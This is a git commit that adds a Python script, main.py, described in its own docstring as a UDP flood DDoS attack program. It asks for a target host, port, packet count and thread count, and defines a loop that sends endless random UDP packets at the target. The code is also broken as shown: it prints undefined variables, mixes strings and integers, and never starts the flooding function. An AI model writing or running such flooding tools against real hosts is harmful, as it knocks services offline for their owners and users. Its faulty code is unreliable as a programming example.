02df179bd15cb69360554d64f2cb4a082dc84588
mouse3 <70779934+mouse3@users.noreply.github.com>
2022-04-23 00:57:14 +0200

    Create main.py

---
+++ main.py
@@ -0,0 +1,78 @@
+"""
+UDP Flooder.
+This is a localhost Ddos attack program to attack servers, you set the IP always that you have permission to do it.
+and the port and the amount of seconds and it will start flooding to that server.
+Usage : ./flood_udp
+Press enter to continue and introduce the data.
+"""
+import signal
+import time
+import socket
+import random
+import threading
+import sys
+import os
+from os import system, name
+
+print("\033[1;34;40m \n")
+os.system("figlet DDOS ATTACK -f slant")
+
+test = input()
+if test == "n":
+	exit(0)
+ip = str(input(" Host/Ip:"))
+port = int(input(" Port:"))
+choice = str(input(" UDP(y/n):"))
+times = int(input("Packetes/conexion(por cada localhost):"))
+threads = int(input(" Hilos(CPU):"))
+print(""+Ip+""+Port+""+times+""+threads+"")
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #It's using the UDP method as you can see in SOCK_DGRAM
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +"Packet Sent!!!")
+		except:
+			s.close()
+			print("[!] Error!!!")
+
+def clear():
+	# for windows
+    if name == 'nt':
+        _ = system('cls')
+
+    # for mac and linux(here, os.name is 'posix')
+    else:
+        _ = system('clear')
+
+def byebye():
+	clear()
+	os.system("figlet Youre Leaving Sir -f slant")
+	sys.exit(130)
+
+def exit_gracefully(signum, frame):
+    # restore the original signal handler as otherwise evil things will happen
+    # in raw_input when CTRL+C is pressed, and our signal handler is not re-entrant
+    signal.signal(signal.SIGINT, original_sigint)
+
+    try:
+        exitc = str(input(" You wanna exit ?:"))
+        if exitc == 'y':
+
+            byebye()
+
+    except KeyboardInterrupt:
+        print("Ok ok, quitting")
+        byebye()
+
+    # restore the exit gracefully handler here
+    signal.signal(signal.SIGINT, exit_gracefully)
+
+if __name__ == '__main__':
+    # store the original SIGINT handler
+    original_sigint = signal.getsignal(signal.SIGINT)
+    signal.signal(signal.SIGINT, exit_gracefully)
